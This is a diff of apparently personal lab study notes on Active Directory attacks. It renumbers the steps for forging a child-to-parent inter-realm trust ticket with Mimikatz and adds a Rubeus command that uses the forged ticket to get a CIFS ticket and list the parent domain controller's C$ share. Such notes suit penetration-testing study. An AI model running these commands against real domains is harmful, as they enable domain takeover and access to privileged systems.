@@ -566,7 +566,7 @@ winrs -r:dcorp-mgmt cmd
 
 
 
-- So, what is required to forge trust tickets is, obviously, the trust key. Look for [In] trust key from child to parent.
+1. So, what is required to forge trust tickets is, obviously, the trust key. Look for [In] trust key from child to parent.
 
 
 
@@ -590,7 +590,7 @@ Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 
 
 
-- We can then forge and inter-realm TGT:
+2. We can then forge and inter-realm TGT:
 
 
 ```powershell
@@ -611,3 +611,13 @@ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:d
 |/ticket|Path where the ticket is to be saved (e.g., C:\AD\Tools\trust_tkt.kirbi)|
 
 
+3. Note that we are still using the TGT forged initially
+
+
+```powershell
+Rubeus.exe asktgs
+/ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi
+/service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-
+dc.moneycorp.local /ptt
+ls \\mcorp-dc.moneycorp.local\c$
+```
